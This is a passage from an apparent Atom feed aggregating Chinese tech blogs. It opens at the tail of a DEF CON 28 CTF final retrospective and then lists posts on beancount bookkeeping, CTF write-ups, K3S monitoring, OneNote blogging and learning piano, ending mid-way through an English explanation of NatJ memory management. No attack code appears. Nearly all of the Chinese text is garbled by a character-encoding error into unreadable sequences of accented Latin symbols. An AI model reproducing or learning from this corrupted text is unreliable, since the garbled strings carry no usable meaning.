è¿™ä¸ªåé—¨ä¼¼çš„æ´ï¼Œè¿˜æœ‰å…¶ä»–é¢˜ç›®å¬å…¶ä»–å¤§å¸ˆå‚…åæ§½ä¹Ÿéƒ½æ˜¯æ‰¾åé—¨çš„é¢˜ç›®ã€‚</p><p>åé¢çœ‹äº†å‡ºé¢˜äººç›¸å…³çš„è®²è¿°ï¼Œè®²è¿°è§†é¢‘åœ°å€ï¼š<a href="https://www.youtube.com/watch?v=g2BDz6yHcbo" target="_blank" rel="noopener">nooode DEF CON 28 CTF Challenge w/ Guest kaptain | CTF Radiooo 003</a> ï¼Œåæ¥è§‰å¾—å§ï¼Œç¡®å®ä¹Ÿè¿˜è¿‡å¾—å»ï¼Œè¿™ä¸ªé¢˜ç›®å¢åŠ äº†ä¸€äº›å¤šå…ƒåŒ–çš„è®¾è®¡ï¼Œå› ä¸ºå¼•å…¥äº†å¾ˆå¤š lib ï¼Œæ‰€ä»¥æœ‰å¾ˆå¤šå§¿åŠ¿å¯ä»¥å»å°è¯•ï¼Œå¯ä»¥å»æŒ–ï¼Œæ¯”èµ›é€”ä¸­é‚£æ¬¡é‡ç½®åº”è¯¥ä¹Ÿå°±æ˜¯åŠ å¼ºäº† checker ï¼Œä¹Ÿçœ‹å¾—å‡º OOO åœ¨è¿™æ–¹é¢è¿˜æ˜¯å°½åŠ›äº†ã€‚ï¼ˆå¦‚æœä½ åˆ æ‰é¢˜ç›®ç»™çš„ node_modules ï¼Œç„¶åé‡æ–° install çš„è¯ï¼Œä¼šå‘ç°å®˜æ–¹ç»™çš„å¤šå‡ºä¸€ä¸ª vm2 ï¼Œå½“æ—¶æˆ‘ä»¬å°±åœ¨æƒ³éš¾ä¸æˆè¿˜å¯èƒ½æ˜¯ vm2 é€ƒé€¸ï¼Ÿä½†æ˜¯åé¢æ‰¾äº†ä¸€ä¼šæ²¡æ‰¾åˆ°å°±æ”¾å¼ƒäº†è¿™æ¡è·¯ã€‚ï¼ˆï¼ˆå› ä¸ºæˆ‘ä»¬å½“æ—¶æƒ³ä¸‡ä¸€ OOO è¿˜åˆ«æœ‰ç”¨å¿ƒåœ°å†æ”¾ä¸€ä¸ªåé—¨åœ¨ node_modules å‘¢ï¼Ÿæ¯•ç«Ÿ Backdooor CTF</p><p>è¿™æ¬¡è™½ç„¶ç®€å•ï¼Œä½†æ˜¯ç¡®å®ä¹Ÿè®©æˆ‘å¢åŠ äº†ä¸€äº›å¯¹äºå¦‚ä½•è®¾è®¡ AWD Web é¢˜ç›®çš„æ€è€ƒï¼ŒåŒ…æ‹¬ @Zach Wade ä¹Ÿæœ‰ç±»ä¼¼çš„æƒ³æ³•:</p><blockquote><p>â€‹    Although I might sound frustrated by this, I think itâ€™s actually an example of really good A/D problem design. Even though the application was straightforward, it presented a variety of options for exploitation.</p></blockquote><h3 id="Something-Else"><a href="#Something-Else" class="headerlink" title="Something Else"></a>Something Else</h3><p>è¿˜æœ‰ä¸€äº›æ¯”è¾ƒæœ‰æ„æ€çš„äº‹å°±æ˜¯ï¼ŒA0E çš„åŒå­¦è¯´ï¼Œæˆ‘ä»¬é˜Ÿçš„å¤§å¸ˆå‚…æ‰‹ç»• A0E å¦‚æœå†å¤šæ‰“ä¸€è½®ï¼Œé‚£ä¹ˆè¿™æ¬¡çš„ç»“æœå°±ä¸ä¸€æ ·äº†ï¼Œä¹Ÿå› ä¸ºè¿™ä¸ªä¿è¯äº†ä¸ PPP é«˜å‡ºçš„ä¸¤åˆ†çš„å·®è·ã€‚ï¼ˆè¿™éš¾é“ä¸å€¼å¾—ä¸€é¡¿é¥­å—ï¼Ÿ</p><p>æ ¹æ®ä¸€äº›ç°æœ‰çš„æŠ¥é“ï¼Œä»¥åŠå‘ä¸€äº› A0E çš„åŒå­¦è€ƒè¯ä¸€äº›é—®é¢˜ï¼Œæ¯”å¦‚ä»–ä»¬çœŸçš„æ˜¯å¾ˆæ—©å°±å‡†å¤‡äº†å—ï¼ŸçœŸçš„æœ‰å¯¹æ¯ä¸ªäººåˆ†ç‰¹æ€§ï¼Œæ¯ä¸ªäººæ“…é•¿ä»€ä¹ˆå—ç­‰ç­‰é—®é¢˜ï¼Œéƒ½å¾—åˆ°äº†è‚¯å®šçš„å›ç­”ï¼Œä¸å¾—ä¸ä½©æœ A0E çš„å›¢é˜Ÿç®¡ç†åä½œèƒ½åŠ› orz è€Œä¸”æ ¹æ®ä»–ä»¬ç»“æŸå½“å¤©çš„åˆç…§æ¥çœ‹ä¼°è®¡ä¹Ÿå¾—æœ‰50å¤šäººå·¦å³å§ã€‚ï¼ˆæ®è¯´ Samurai å‚èµ›äººæ•°è¾¾åˆ°äº†ææ€–çš„150äºº</p><p>è™½ç„¶ PPP è¡¨ç¤ºè‡ªå·± â€œSince DEF CON CTF is such an important competition for us, we traditionally spend the month leading up to it in preparation and organization. This year, we did not.â€ ï¼Œä½†æ˜¯ä¹Ÿå±•ç¤ºå‡ºäº†ä¸€å¦‚æ—¢å¾€å¯¹ DEFCON çš„ç»Ÿæ²»åŠ›ã€‚</p><p>è‡ªå·±åœ¨æ¯”èµ›çš„æ—¶å€™ç”±äºè‡ªèº«èƒ½åŠ›è¾ƒå·®ä»¥åŠç¬¬ä¸€æ¬¡è·Ÿå¤§å¸ˆå‚…ä»¬é…åˆï¼Œå½“æ—¶æ¯”èµ›é…åˆå¾—ä¸æ˜¯ç›¸å½“çš„å¥½ï¼Œå¯èƒ½å¯¼è‡´äº†ä¸€äº›å¤±åˆ†ï¼Œå¦‚æœä»¥åè¿˜æœ‰æœºä¼šï¼Œå¸Œæœ›è‡ªå·±æå‡èƒ½åŠ›çš„åŒæ—¶ï¼Œä¹Ÿèƒ½å°½é‡æé«˜ä¸€äº›åˆä½œçš„èƒ½åŠ›ã€‚</p><p>æ€»çš„æ¥è¯´ï¼Œæ³¡é¢ã€å¤–å–å¾ˆå¥½åƒï¼Œå…¬å¸åŠå…¬æ¤…å¾ˆèˆ’æœï¼Œâ€œç½‘ç®¡â€è¿ç»´é€‰æ‰‹éå¸¸ç»™åŠ›ï¼Œå¤§å¸ˆå‚…ä»¬éƒ½éå¸¸éå¸¸çš„å‰å®³ã€‚ä»Šå¹´å¯¹ä¸€å¼€å§‹çš„ KOH ä»¥åŠæœ€åçš„ Web åšäº†ä¸€ç‚¹ç‚¹å¾®å°çš„è´¡çŒ®ï¼Œå¦‚æœä»¥åæœ‰æœºä¼šçš„è¯å¸Œæœ›èƒ½åšåˆ°æ›´å¤§çš„è´¡çŒ®å­ï¼</p><p>å†æ¬¡æ­å–œ A*0*E æ‹¿åˆ° DEFCON 28 CTF Final å† å†›ï¼</p><h1 id="Others-Notes"><a href="#Others-Notes" class="headerlink" title="Others Notes"></a>Others Notes</h1><p>PPP â€“ Zach Wade çš„å›é¡¾ï¼š <a href="https://dttw.tech/posts/Skww4fzGP" target="_blank" rel="noopener">Kernel Panic: A DEF CON 2020 Retrospective</a></p><p>r3kapig â€“ Y1ng çš„å›é¡¾ï¼š<a href="https://www.gem-love.com/ctf/2558.html" target="_blank" rel="noopener">DEFCON 28 CTF Final Safe Modeå‚èµ›è®°å½•</a></p></body></html>]]></content>
        <author>
            <name><![CDATA[Zeddâ€™s Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://blog.triplez.cn/posts/beancount-lend-return-bookkeeping-method/</id>
        <title><![CDATA[æµ…è°ˆ beancount å€Ÿæ¬¾è¿˜æ¬¾äº¤æ˜“è®°å½•æ–¹æ³•]]></title>
        <updated>2021-08-10T14:38:24+08:00</updated>
        <link href="https://blog.triplez.cn/posts/beancount-lend-return-bookkeeping-method/"/>
        <content type="text/html" src="https://blog.triplez.cn/posts/beancount-lend-return-bookkeeping-method/"><![CDATA[æœ¬æ–‡åŸºäºçš„å‡è®¾æ˜¯ï¼šå‹äºº A éœ€è¦è´­ä¹°äº§å“ Bï¼Œä½†éœ€è¦ä½ æ¥ä»£ä»–è´­ä¹°ã€‚æ¢è®¨å‡ ç§äº‹ä»¶å‘ç”Ÿé¡ºåºçš„è®°è´¦æ–¹æ³•ã€‚]]></content>
        <author>
            <name><![CDATA[TripleZâ€™s Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://miaotony.xyz/2021/08/07/CTF_2021dianfengjike/</id>
        <title><![CDATA[CTF | 2021 å·…å³°æå®¢ç½‘ç»œå®‰å…¨æŠ€èƒ½æŒ‘æˆ˜èµ› WriteUp]]></title>
        <updated>2021-08-08T20:01:44+08:00</updated>
        <link href="https://miaotony.xyz/2021/08/07/CTF_2021dianfengjike/"/>
        <content type="text/html" src="https://miaotony.xyz/2021/08/07/CTF_2021dianfengjike/"><![CDATA[ä¸Šå‘¨æœ«æ‘¸é±¼æ‰“äº†ä¸‹å·…å³°æå®¢ç½‘ç»œå®‰å…¨æŠ€èƒ½æŒ‘æˆ˜èµ›ï¼Œé¢˜ç›®å¥½éš¾å•Šå–µå‘œå‘œï¼Œå°±å¤ç°ä¸€ä¸‹éšä¾¿å†™å†™å¥½äº†ã€‚]]></content>
        <author>
            <name><![CDATA[MiaoTony]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://blog.stdioa.com/2020/09/using-beancount/</id>
        <title><![CDATA[å¼€å§‹ä½¿ç”¨ Beancount]]></title>
        <updated>2021-08-04T02:58:19+08:00</updated>
        <link href="https://blog.stdioa.com/2020/09/using-beancount/"/>
        <content type="text/html" src="https://blog.stdioa.com/2020/09/using-beancount/"><![CDATA[<p>ä½¿ç”¨ Beancount è®°è´¦å·²ç»æœ‰å°†è¿‘ä¸¤ä¸ªæœˆäº†ï¼Œç®€å•å†™ä¸€å†™æˆ‘éƒ½åšäº†ä»€ä¹ˆã€‚</p>]]></content>
        <author>
            <name><![CDATA[Stdioâ€™s Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://miaotony.xyz/2021/07/29/Life_2021RedHatFinal_trip/</id>
        <title><![CDATA[ç¢ç¢å¿µ | 2021 çº¢å¸½æ¯ ç½‘ç»œå®‰å…¨å¤§èµ›æ€»å†³èµ› å¹¿å·æ¸¸è®°]]></title>
        <updated>2021-07-30T20:46:02+08:00</updated>
        <link href="https://miaotony.xyz/2021/07/29/Life_2021RedHatFinal_trip/"/>
        <content type="text/html" src="https://miaotony.xyz/2021/07/29/Life_2021RedHatFinal_trip/"><![CDATA[å‰å‡ å¤©å»å¹¿å·æ‰“äº†ç¬¬å››å±Šçº¢å¸½æ¯ç½‘ç»œå®‰å…¨å¤§èµ›æ€»å†³èµ›ï¼Œè¿™é‡Œæ¥éšä¾¿è®°å½•ä¸€ä¸‹åœ¨å¹¿å·çš„æ¸¸è®°å§~]]></content>
        <author>
            <name><![CDATA[MiaoTony]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://blog.stdioa.com/2021/07/scrape-prometheus-metrics-outside-kubernetes/</id>
        <title><![CDATA[åœ¨ K3S é›†ç¾¤å¤–ç›‘æ§é›†ç¾¤å†…çš„æŒ‡æ ‡]]></title>
        <updated>2021-07-11T11:58:14+08:00</updated>
        <link href="https://blog.stdioa.com/2021/07/scrape-prometheus-metrics-outside-kubernetes/"/>
        <content type="text/html" src="https://blog.stdioa.com/2021/07/scrape-prometheus-metrics-outside-kubernetes/"><![CDATA[<p><s>åƒé¥±äº†æ’‘çš„</s>ï¼Œå°è¯•ä¸€ä¸‹ Prometheus åœ¨ K3S é›†ç¾¤å¤–æŠ“å–é›†ç¾¤å†…æŒ‡æ ‡çš„è‹¥å¹²å§¿åŠ¿ã€‚</p>]]></content>
        <author>
            <name><![CDATA[Stdioâ€™s Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://www.suruifu.com/posts/640</id>
        <title><![CDATA[å¦‚ä½•ä½¿ç”¨OneNoteå‘å¸ƒåšå®¢]]></title>
        <updated>2021-06-28T18:21:36+08:00</updated>
        <link href="https://www.suruifu.com/posts/640"/>
        <content type="text/html" src="https://www.suruifu.com/posts/640"><![CDATA[<ol style="margin-left: 63pt">
<li><span style="font-family:å¾®è½¯é›…é»‘">ç‚¹å‡»æ–‡ä»¶ï¼Œå‘é€ï¼Œå‘é€åˆ°åšå®¢<br />
</span></li>
</ol>
<p><img src="https://s.suruifu.com/www/2021/06/062821_1821_OneNote1.png" alt=""/>
    </p>
<ol style="margin-left: 63pt">
<li><span style="font-family:å¾®è½¯é›…é»‘">é€‰æ‹©åšå®¢æä¾›å•†ï¼Œæ¯”å¦‚è¯´Wordpress<br />
</span></li>
<li><span style="font-family:å¾®è½¯é›…é»‘">å¡«å†™è´¦å·ç”¨æˆ·åï¼Œå¯†ç <br />
</span></li>
<li><span style="font-family:å¾®è½¯é›…é»‘">å›¾ç‰‡ä½¿ç”¨åšå®¢ç³»ç»Ÿ<br />
</span></li>
</ol>
<p>Â <br />
Â </p>
<p><span style="font-family:å¾®è½¯é›…é»‘">æ•´ä¸ªè¿‡ç¨‹ä½¿ç”¨ä½“éªŒ<strong>å¾ˆå¥½</strong>ï¼<br />
</span></p>
<p><span style="font-family:å¾®è½¯é›…é»‘">å¤‡æ³¨ï¼šè¿™ç¯‡åšå®¢å°±æ˜¯ä½¿ç”¨OneNoteå‘å¸ƒçš„<br />
</span></p>
<p><em><span style="font-family:å¾®è½¯é›…é»‘">å¤‡æ³¨</span>2<span style="font-family:å¾®è½¯é›…é»‘">ï¼š æˆ‘ä½¿ç”¨çš„æ˜¯Office 365ï¼Œæ¢å¥è¯è¯´æˆ‘æ²¡æœ‰ä½¿ç”¨UWPç‰ˆæœ¬çš„OneNoteï¼</span></em></p>
<p>
<b>è¿™æ˜¯åé¢åŠ çš„ã€‚æˆ‘å‘ç°å›¾ç‰‡æ²¡æœ‰è¢«æ­£ç¡®æ·»åŠ ï¼Œå¯èƒ½æ˜¯å› ä¸ºæˆ‘ä½¿ç”¨äº†ossçš„æ’ä»¶ã€‚è¿™ä¸ªå¯èƒ½è¿˜æ˜¯éœ€è¦è°ƒä¸€ä¸‹ã€‚</b></p>]]></content>
        <author>
            <name><![CDATA[è‹ç‘è¾…çš„ä¸ªäººç½‘ç«™]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://blog.triplez.cn/posts/monthly-bookkeeping-workflow/</id>
        <title><![CDATA[æœˆåº¦è®°è´¦å·¥ä½œæµ]]></title>
        <updated>2021-06-27T04:57:49+08:00</updated>
        <link href="https://blog.triplez.cn/posts/monthly-bookkeeping-workflow/"/>
        <content type="text/html" src="https://blog.triplez.cn/posts/monthly-bookkeeping-workflow/"><![CDATA[ä¸ªäººè®°è´¦å·¥ä½œæµè®°å½•]]></content>
        <author>
            <name><![CDATA[TripleZâ€™s Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://blog.triplez.cn/posts/bills-export-methods/</id>
        <title><![CDATA[å¤šç§æ”¯ä»˜è´¦æˆ·çš„è´¦å•å¯¼å‡ºåŠæŸ¥çœ‹æ–¹æ³•æ±‡æ€»]]></title>
        <updated>2021-06-19T03:05:38+08:00</updated>
        <link href="https://blog.triplez.cn/posts/bills-export-methods/"/>
        <content type="text/html" src="https://blog.triplez.cn/posts/bills-export-methods/"><![CDATA[æœ¬æ–‡æ¶µç›–æ”¯ä»˜å®ã€å¾®ä¿¡ï¼Œå·¥è¡Œã€äº¤è¡Œå€Ÿè®°å¡ï¼Œæ‹›è¡Œä¿¡ç”¨å¡ä»¥åŠç«å¸-å¸å¸äº¤æ˜“çš„è´¦å•å¯¼å‡ºæ–¹æ³•]]></content>
        <author>
            <name><![CDATA[TripleZâ€™s Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>http://blog.qrzbing.cn/post/2021-ciscn-little-evil/</id>
        <title><![CDATA[CISCN 2021 Little Evil]]></title>
        <updated>2021-06-07T12:25:50+08:00</updated>
        <link href="http://blog.qrzbing.cn/post/2021-ciscn-little-evil/"/>
        <content type="text/html" src="http://blog.qrzbing.cn/post/2021-ciscn-little-evil/"><![CDATA[<p>å¯¹ KLEE çš„å­¦ä¹ ï¼Œä¸€äº›å°å°çš„è‡ªåŠ¨åŒ–æ“ä½œã€‚</p>]]></content>
        <author>
            <name><![CDATA[QRZâ€™s Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://www.suruifu.com/posts/632</id>
        <title><![CDATA[ã€æéŸ³ä¹ã€‘æˆ‘ä¹Ÿæ¥æéŸ³ä¹]]></title>
        <updated>2021-06-06T13:13:05+08:00</updated>
        <link href="https://www.suruifu.com/posts/632"/>
        <content type="text/html" src="https://www.suruifu.com/posts/632"><![CDATA[<p>æœ€è¿‘å·¥ä½œä¹Ÿå¾ˆå¿™ï¼Œæ€ä¹ˆæƒ³èµ·æ¥ç ”ç©¶ä¸€ä¸‹éŸ³ä¹äº†å‘¢ï¼Ÿ</p>
<p>å…¶ä¸€ï¼Œå› ä¸ºå¯ä»¥å¿™é‡Œå·é—²ã€‚åŒæ ·æ˜¯ç©ï¼Œæˆ‘æ›´æƒ³ç ”ç©¶ä¸€ç‚¹ä¸ä¸€æ ·çš„ã€‚</p>
<p>å…¶äºŒï¼Œæˆ‘å‘ç°å­¦ç§‘ä¹‹é—´æ˜¯å­˜åœ¨å…³è”æ€§çš„ï¼Œçœ‹ç‚¹åˆ«çš„åè€Œèƒ½ç»™è‡ªå·±çš„å·¥ä½œå¸¦æ¥æ–°çš„å¯è¿ªã€‚æ­£æ‰€è°“â€œä»–å±±ä¹‹çŸ³ï¼Œå¯ä»¥æ”»ç‰â€ã€‚</p>
<p>å…¶ä¸‰ï¼Œæˆ‘å‘ç°éŸ³ä¹æ˜¯å¾ˆé«˜çº§çš„ä¸œè¥¿ï¼Œæˆ‘ä¹Ÿæƒ³æœ‰æ‰€äº†è§£ã€‚</p>
<p>å…¶å››ï¼Œæœ€è¿‘å·¥ä½œä¸­è®¤è¯†äº†ä¸€ä½éŸ³ä¹å®¶ã€‚</p>
<p>æˆ‘ç°åœ¨ä¹Ÿæ²¡æœ‰é’¢ç´ï¼Œä¹Ÿæ²¡æœ‰ç”µå­ç´ï¼Œä¹Ÿæ²¡æœ‰ä»»ä½•ä¹å™¨ï¼Œä¹Ÿæ²¡æœ‰æ¥è§¦è¿‡éŸ³ä¹ï¼Œä¹Ÿæ²¡æœ‰æ¥è§¦è¿‡ä»»ä½•ä¹å™¨ã€‚å½“ç„¶ï¼Œé™¤äº†ä¹‹å‰åœ¨å‰å¥³å‹å®¶æ‘¸è¿‡ä¸€æ¬¡é’¢ç´ã€‚</p>
<p>æˆ‘ä¹Ÿä¸æƒ³å˜å¾—å¤šå¼ºï¼Œæˆ‘æƒ³èƒ½çœ‹æ‡‚äº”çº¿è°±ï¼Œèƒ½ç”¨é’¢ç´å¼¹å‡ºæ¥æˆ‘å°±å¿ƒæ»¡æ„è¶³äº†ã€‚ä¸éœ€è¦å¤šå‰å®³ã€‚</p>
<p>ä½†æ˜¯æˆ‘ç°åœ¨ä»€ä¹ˆä¹Ÿæ²¡æœ‰ï¼Œæˆ‘æœ¬æ¥æƒ³å»ç»ƒç´æˆ¿ç ”ç©¶ä¸€ä¸‹ï¼Œä½†æ˜¯äººå®¶è¯´æå‰é¢„çº¦ï¼Œæ‰€ä»¥ä»Šå¤©å°±æ²¡æœ‰ç©æˆåŠŸã€‚ä½†æ˜¯å¿ƒé‡Œé¢è¿˜æ˜¯æ”¾ä¸ä¸‹ï¼Œæ‰€ä»¥æ‰¾åˆ°äº†ä¸€ä¸ªç½‘é¡µï¼Œè¿™ä¸ªç½‘é¡µåªè¦ä¼šæ•²é”®ç›˜å°±å¯ä»¥å‘å‡ºå£°éŸ³ã€‚ä½†æ˜¯æ“ä½œèµ·æ¥æ¯”è¾ƒéº»çƒ¦ï¼Œä¸€ä¸ªéŸ³é˜¶çš„è¿˜å¥½è¯´ï¼Œè·¨éŸ³é˜¶çš„è„‘å­å°±è½¬ä¸è¿‡æ¥ã€‚å› ä¸ºä½ è¦åšä¸€ä¸ªå¤æ‚çš„é”®ä½å’Œç”µè„‘é”®ç›˜çš„æ˜ å°„ã€‚</p>
<p>æˆ‘ç®€å•è¯•äº†ä¸‰ä¸ªéŸ³ä¹ç‰‡æ®µï¼Œåˆ†åˆ«æ˜¯å°æ˜Ÿæ˜Ÿï¼Œæ‰“é¶å½’æ¥ï¼Œå›½é™…æ­Œã€‚å°æ˜Ÿæ˜Ÿæ˜¯æœ€ç®€å•çš„ï¼Œæ‰“é¶å½’æ¥ï¼Œç•¥å¤æ‚ä¸€ç‚¹ï¼Œå›½é™…æ­Œå°±å¾ˆé«˜çº§äº†ã€‚è¿™é‡Œæ‰€è¯´çš„é«˜çº§å’Œä½çº§å°±è¯´çš„æ˜¯å›½é™…æ­Œæ¶‰åŠåˆ°å¤šä¸ªéŸ³é˜¶ä¹‹é—´çš„è·³è·ƒï¼Œå¯¹æˆ‘è¿™ä¸ªåˆå­¦è€…æ¥è¯´ï¼Œç”¨ç”µè„‘é”®ç›˜å°±å¾ˆéº»çƒ¦äº†ã€‚</p>
<p>æˆ‘æŠŠè§†é¢‘ä¸Šä¼ åˆ°äº†Bilibiliï¼Œå’Œå¤§å®¶äº¤æµå­¦ä¹ ã€‚</p>
<p>https://space.bilibili.com/76786111</p>
<p>é¡ºä¾¿è¯´æ˜å‘€ï¼Œå…¶å®æˆ‘è¿ç®€è°±çš„éŸ³é«˜éƒ½åˆ†åˆ«ä¸å‡ºæ¥ï¼Œæˆ‘åªæ˜¯å¯¹ç”µè„‘é”®ç›˜å¾ˆç†Ÿæ‚‰ç½¢äº†ã€‚å¦‚æœåªæ¶‰åŠåˆ°ä¸€ä¸ª1234567ï¼Œæ²¡æœ‰é«˜éŸ³å’Œä½éŸ³ï¼Œæˆ‘ç”¨ç”µè„‘ç®€å•å¯ä»¥å¾ˆè½»æ¾åœ°æŒ‰å‡ºæ¥ã€‚</p>
<p>åé¢æˆ‘æƒ³ï¼Œæˆ‘è¦ä¹ˆå¼„ä¸ªç”µå­ç´ï¼ˆ500å—å·¦å³å§ï¼‰ï¼Œè¦ä¹ˆå°±å»ç»ƒç´æˆ¿åŠä¸ªå¡ï¼ˆ10å—é’±ä¸€ä¸ªå°æ—¶ï¼‰ã€‚æ®è¯´è¿™ä¸ªè¡Œå½“é‡Œé¢ä¹Ÿæ˜¯å­˜åœ¨é„™è§†é“¾çš„ï¼Œè¯´æ˜¯é’¢ç´æ¯”è¾ƒé«˜çº§ï¼Œç”µå­ç´æ¯”è¾ƒåƒåœ¾ã€‚æˆ‘è§‰å¾—å…¶å®æ— æ‰€è°“ï¼Œè¿™å¯èƒ½å°±è·Ÿç¼–ç¨‹è¯­è¨€é‡Œé¢äº’ç›¸äº‰å“ªä¸ªè¯­è¨€æ›´å¥½çš„é—®é¢˜ä¸€æ ·ï¼Œæ²¡æœ‰ä»€ä¹ˆæ„ä¹‰ã€‚æˆ‘è®¤ä¸ºç¼–ç¨‹è¯­è¨€æ²¡æœ‰ä»€ä¹ˆå¥½åï¼Œåªè¦çŸ¥ç®—æ³•ï¼Œæ‡‚æ•°æ®ç»“æ„ï¼Œè¿™äº›åªæ˜¯å·¥å…·ã€‚å¯¹äºé’¢ç´ï¼Œæˆ‘çŒœå‘€ï¼Œåªè¦è®¤è¯†ä¹è°±ï¼Œèƒ½å¤ŸæŠŠæ¡èŠ‚å¥ï¼Œä¹Ÿéƒ½èƒ½åšå¥½ï¼Œåªä¸è¿‡åˆ‡æ¢çš„æ—¶å€™éœ€è¦ä¸€ä¸ªé€‚åº”çš„æ—¶é—´ç½¢äº†ã€‚</p>
<p>å¦å¤–å‘¢ï¼Œæˆ‘ä¹Ÿä¸è®¤è¯†ç®€è°±é‡Œé¢çš„ä¸¤ä¸ªè¿ä¸€èµ·ä¸‹é¢åŠ ä¸ªä¸‹åˆ’çº¿é‚£æ ·çš„ï¼Œå¦‚æœè¯´ï¼Œä¸‰ä¸ªï¼Œä¸¤ä¸ªåŠ ä¸ªä¸‹åˆ’çº¿ï¼Œä¸‰ä¸ªå†åŠ ä¸ªä¸‹åˆ’çº¿å°±æœ‰ç‚¹è®©äººä¸çŸ¥é“è¯¥æ€ä¹ˆæ“ä½œäº†ã€‚æ¯”å¦‚è¯´ä¸‹é¢è¿™ä¸ªã€‚</p>
<p>å›¾ç‰‡</p>
<p><img src="https://s.suruifu.com/www/2021/06/640.png" alt="" /></p>
<p>è°¢è°¢å¤§å®¶ï¼Œç¥å¤§å®¶å·¥ä½œé¡ºåˆ©ï¼Œç”Ÿæ´»æ„‰å¿«ï¼</p>
<p>æˆ‘å»æ¬ç –äº†ï¼Œå¤§å®¶ä¸‹æœŸè§ï¼</p>]]></content>
        <author>
            <name><![CDATA[è‹ç‘è¾…çš„ä¸ªäººç½‘ç«™]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://www.noisyfox.io/natj-memory-management.html</id>
        <title><![CDATA[A Brief Explanation of Memory Management in NatJ]]></title>
        <updated>2021-05-17T14:15:50+08:00</updated>
        <link href="https://www.noisyfox.io/natj-memory-management.html"/>
        <content type="text/html" src="https://www.noisyfox.io/natj-memory-management.html"><![CDATA[<p><a href="https://github.com/multi-os-engine/moe-natj" target="_blank" rel="noreferrer noopener">NatJ</a> is the Java library used by MOE for interoperating with native APIs, such as creating Java bindings of Objective-C classes and calling C APIs directly in Java without the need of writing wrappers in JNI by your own. One critical problem NatJ needs to handle is the difference in the way Java and native APIs manage memory: Java uses GC, while Objective-C uses ARC, and C requires manual memory management by calling <code>free()</code> explicitly.</p>



<h2>C</h2>



<p>When interoperating with C APIs, the rules are simple:</p>



<ul><li>When the native object (anything you allocate with <code>malloc</code> etc.) has the same lifecycle as the corresponding Java representative object (<code><a href="https://github.com/multi-os-engine/moe-natj/blob/3ebc36fa4da160bf93b018686ee3ca5076ad61ee/src/main/java/org/moe/natj/general/Pointer.java" target="_blank" rel="noreferrer noopener">org.moe.natj.general.Pointer</a></code>), i.e., the native object is OWNED by your Java code, then as soon as the <code>Pointer</code> instance is GC-ed, the native memory will be <code>free()</code>-ed automatically (by the <code><a href="https://github.com/multi-os-engine/moe-natj/blob/3ebc36fa4da160bf93b018686ee3ca5076ad61ee/src/main/java/org/moe/natj/c/CRuntime.java#L120-L130" target="_blank" rel="noreferrer noopener">CRuntime.strongReleaser</a></code>).</li><li>When the native object is not owned by the Java side, then NatJ won&#8217;t do anything for you. You need to free it by yourself when appropriate.</li></ul>



<p>These two rules correspond to the <code>owned</code> parameter of the <a href="https://github.com/multi-os-engine/moe-natj/blob/3ebc36fa4da160bf93b018686ee3ca5076ad61ee/src/main/java/org/moe/natj/c/CRuntime.java#L143-L145" target="_blank" rel="noreferrer noopener"><code>CRuntime.createStrongPointer</code> method</a>.</p>



<h2>Objective-C</h2>



<p>Objective-C uses ARC. Every OC object has a reference counter. The object will be deallocated as soon as the reference counter reaches 0. This creates several restrictions when using OC objects in Java world (and vice versa):</p>



<ol id="objc-restriction"><li>When a Java instance is passed to native side by mapping to an OC object (i.e., a Java object of the <a href="https://github.com/multi-os-engine/moe-natj/blob/3ebc36fa4da160bf93b018686ee3ca5076ad61ee/src/main/java/org/moe/natj/objc/ObjCObject.java#L31-L33" target="_blank" rel="noreferrer noopener">hybrid or inherited mode</a>), and that OC object is retained on the native side (e.g. the <code>retain</code> function is called on this object), the Java GC should not attempt to free that object.</li><li>When a Java representative object is still used by the Java code (i.e., the object has not been finalized by GC thread), the corresponding native object should not be deallocated by ARC (i.e., the reference count should not reach 0).</li></ol>



<p>NatJ has two major different types of relationships between Java object and OC object, which can be found <a href="https://github.com/multi-os-engine/moe-natj/blob/3ebc36fa4da160bf93b018686ee3ca5076ad61ee/src/main/java/org/moe/natj/objc/ObjCObject.java#L29-L38" target="_blank" rel="noreferrer noopener">here</a>, based on whether the Java object stores any extra state:</p>



<ol><li>A <strong>Binding</strong> class, which simply represents an existing Objective-C object, with ALL of the states store in the OC object, and ALL methods are implemented on the native side;</li><li>A class which stores part of (or all) the states in Java object, and/or implement part of (or all) the methods in Java, which then can be divided further into two types:<ul><li>An <strong>Inherited</strong> class, which ALL states are stored in the Java object, and ALL methods are implemented in Java;</li><li>A <strong>Hybrid</strong> class, which sits in between.</li></ul></li></ol>



<h3>Binding Class</h3>



<p>The reason of categorizing them into 2 major types is whether they are affected by the <a href="#objc-restriction">restriction 1</a>.</p>



<p>When the states are stored purely on the native side, there is no need of keeping a permanent 1-to-1 mapping between the native object and the Java object. and the life span of the Java object can also be shorter than the native object. In other word, you can have multiple Java objects that point to the same native object, and those Java bindings can be GC-ed at anytime BEFORE the native object is deallocated.</p>



<p>For these reasons, a Binding class works similar to ARC: when a binding object is created, the corresponding native object will be <a href="https://github.com/multi-os-engine/moe-natj/blob/3ebc36fa4da160bf93b018686ee3ca5076ad61ee/src/main/java/org/moe/natj/objc/map/ObjCObjectMapper.java#L104" target="_blank" rel="noreferrer noopener">retained</a> (i.e., reference count + 1), and when the binding object is finalized by GC, the corresponding native object will be <a href="https://github.com/multi-os-engine/moe-natj/blob/3ebc36fa4da160bf93b018686ee3ca5076ad61ee/src/main/java/org/moe/natj/objc/map/ObjCObjectMapper.java#L83" target="_blank" rel="noreferrer noopener">released</a>, thus guarantees the <a href="#objc-restriction">restriction 2</a>.</p>



<h3>Inherited &amp; Hybrid Class</h3>



<p>On the other hand, for an inherited/hybrid class, it&#8217;s important to make sure the Java object has the same lifetime as the native object.</p>



<p>To meet restriction 1, NatJ needs a way of telling if the native object is held (retained) by any native code. Normally when an OC object is now held by anything, it&#8217;s reference count will be 0 and that&#8217;s when this object is deallocated. </p>



